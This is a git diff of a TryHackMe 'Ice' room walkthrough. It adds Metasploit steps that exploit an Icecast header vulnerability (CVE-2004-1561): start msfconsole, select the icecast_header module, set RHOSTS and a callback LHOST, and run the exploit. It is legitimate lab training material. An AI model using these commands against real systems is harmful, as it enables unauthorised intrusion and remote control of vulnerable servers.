@@ -2,7 +2,9 @@
 
 Room: [Ice](https://tryhackme.com/room/ice)
 
-Room Prerequisite: [Nmap](https://tryhackme.com/room/furthernmap)
+Prerequisites: 
+1. [Nmap](https://tryhackme.com/room/furthernmap)
+2. [Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)
 
 <img width="935" height="206" alt="image" src="https://github.com/user-attachments/assets/3d944a7e-dee2-43cd-bc1d-48fb376c5b83" />
 
@@ -63,6 +65,45 @@ You can refer to the [Icecast Exploit -Rapid7](https://www.rapid7.com/db/modules
 2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
 
 CVE-2004-1561
+
+3. Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`
+
+<img width="425" height="347" alt="image" src="https://github.com/user-attachments/assets/6393a480-eccc-4eb3-9877-98ddfa2dcda2" />
+
+4. After Metasploit has started, let's search for our target exploit using the command `search icecast`. What is the full path (starting with exploit) for the exploitation module? 
+
+`exploit/windows/http/icecast_header`
+
+<img width="565" height="141" alt="image" src="https://github.com/user-attachments/assets/810a9e18-3c01-4af6-a4e3-fa3e21707f31" />
+
+5. Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.
+
+<img width="379" height="38" alt="image" src="https://github.com/user-attachments/assets/40a20a01-0129-46a5-86e6-0930d9902eca" />
+
+6. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
+
+RHOSTS
+
+<img width="1431" height="607" alt="image" src="https://github.com/user-attachments/assets/b95954d6-1d89-48f0-92cc-3039ce4b5b34" />
+
+7. First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`.
+
+First set up your LHOSTS with your tun0 IP which you can also see by command: `ifconfig` and then do command: `set LHOST TUN0_IP`
+
+<img width="1423" height="279" alt="image" src="https://github.com/user-attachments/assets/0f997bba-8d5f-4910-9a35-b2d0edaddfb1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
